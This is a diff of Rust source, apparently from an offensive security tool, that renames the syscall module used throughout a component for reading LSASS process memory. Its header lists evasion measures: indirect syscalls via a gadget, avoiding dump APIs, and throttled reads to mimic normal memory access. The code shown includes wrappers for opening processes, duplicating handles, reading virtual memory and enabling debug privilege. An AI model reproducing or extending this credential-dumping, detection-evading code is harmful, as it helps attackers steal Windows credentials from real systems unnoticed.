@@ -13,7 +13,7 @@
 //!
 //! # OPSEC
 //!
-//! - ALL NT API calls go through `nt_syscall::do_syscall` (call r11 → syscall; ret gadget)
+//! - ALL NT API calls go through `crate::syscalls::do_syscall` (call r11 → syscall; ret gadget)
 //! - No `MiniDumpWriteDump` or any dump-file API is ever called
 //! - No threads are created in LSASS
 //! - 64 KiB sequential reads with 50 ms sleeps between regions mimic normal memory access patterns
@@ -89,7 +89,7 @@ const fn fnv1a(data: &[u8]) -> u32 {
 }
 
 // ── Indirect syscall wrappers ──────────────────────────────────────────────
-// Thin wrappers around nt_syscall::get_syscall_id + do_syscall to keep the
+// Thin wrappers around crate::syscalls::get_syscall_id + do_syscall to keep the
 // main logic clean.  These mirror the pattern established in
 // token_manipulation.rs.
 
@@ -100,11 +100,11 @@ unsafe fn nt_query_system_information(
     size: u32,
     return_length: *mut u32,
 ) -> i32 {
-    let target = match nt_syscall::get_syscall_id("NtQuerySystemInformation") {
+    let target = match crate::syscalls::get_syscall_id("NtQuerySystemInformation") {
         Ok(t) => t,
         Err(_) => return -1,
     };
-    nt_syscall::do_syscall(
+    crate::syscalls::do_syscall(
         target.ssn,
         target.gadget_addr,
         &[
@@ -151,9 +151,9 @@ unsafe fn nt_open_process(
 
     #[cfg(not(all(windows, feature = "syscall-emulation")))]
     {
-        let target = nt_syscall::get_syscall_id("NtOpenProcess")
+        let target = crate::syscalls::get_syscall_id("NtOpenProcess")
             .map_err(|e| anyhow!("NtOpenProcess SSN resolution: {e}"))?;
-        let status = nt_syscall::do_syscall(
+        let status = crate::syscalls::do_syscall(
             target.ssn,
             target.gadget_addr,
             &[
@@ -181,9 +181,9 @@ unsafe fn nt_duplicate_object(
     options: u32,
 ) -> Result<HANDLE> {
     let mut new_handle: HANDLE = ptr::null_mut();
-    let target = nt_syscall::get_syscall_id("NtDuplicateObject")
+    let target = crate::syscalls::get_syscall_id("NtDuplicateObject")
         .map_err(|e| anyhow!("NtDuplicateObject SSN resolution: {e}"))?;
-    let status = nt_syscall::do_syscall(
+    let status = crate::syscalls::do_syscall(
         target.ssn,
         target.gadget_addr,
         &[
@@ -233,8 +233,8 @@ unsafe fn nt_query_virtual_memory(
 
     #[cfg(not(all(windows, feature = "syscall-emulation")))]
     {
-        let target = nt_syscall::get_syscall_id("NtQueryVirtualMemory").ok()?;
-        let status = nt_syscall::do_syscall(
+        let target = crate::syscalls::get_syscall_id("NtQueryVirtualMemory").ok()?;
+        let status = crate::syscalls::do_syscall(
             target.ssn,
             target.gadget_addr,
             &[
@@ -284,9 +284,9 @@ unsafe fn nt_read_virtual_memory(
 
     #[cfg(not(all(windows, feature = "syscall-emulation")))]
     {
-        let target = nt_syscall::get_syscall_id("NtReadVirtualMemory")
+        let target = crate::syscalls::get_syscall_id("NtReadVirtualMemory")
             .map_err(|e| anyhow!("NtReadVirtualMemory SSN resolution: {e}"))?;
-        let status = nt_syscall::do_syscall(
+        let status = crate::syscalls::do_syscall(
             target.ssn,
             target.gadget_addr,
             &[
@@ -323,9 +323,9 @@ fn nt_close(handle: HANDLE) {
 
     #[cfg(not(all(windows, feature = "syscall-emulation")))]
     {
-        if let Ok(target) = nt_syscall::get_syscall_id("NtClose") {
+        if let Ok(target) = crate::syscalls::get_syscall_id("NtClose") {
             let _ = unsafe {
-                nt_syscall::do_syscall(target.ssn, target.gadget_addr, &[handle as u64])
+                crate::syscalls::do_syscall(target.ssn, target.gadget_addr, &[handle as u64])
             };
         }
     }
@@ -715,10 +715,10 @@ fn enable_debug_privilege() -> Result<bool> {
     let current_process: HANDLE = (-1isize) as HANDLE; // GetCurrentProcess pseudo-handle
     let mut token: HANDLE = ptr::null_mut();
     {
-        let target = nt_syscall::get_syscall_id("NtOpenProcessToken")
+        let target = crate::syscalls::get_syscall_id("NtOpenProcessToken")
             .map_err(|e| anyhow!("NtOpenProcessToken SSN resolution: {e}"))?;
         let status = unsafe {
-            nt_syscall::do_syscall(
+            crate::syscalls::do_syscall(
                 target.ssn,
                 target.gadget_addr,
                 &[
@@ -788,10 +788,10 @@ fn enable_debug_privilege() -> Result<bool> {
     tp.Privileges[0].Attributes = 2; // SE_PRIVILEGE_ENABLED
 
     {
-        let target = nt_syscall::get_syscall_id("NtAdjustPrivilegesToken")
+        let target = crate::syscalls::get_syscall_id("NtAdjustPrivilegesToken")
             .map_err(|e| anyhow!("NtAdjustPrivilegesToken SSN resolution: {e}"))?;
         let status = unsafe {
-            nt_syscall::do_syscall(
+            crate::syscalls::do_syscall(
                 target.ssn,
                 target.gadget_addr,
                 &[
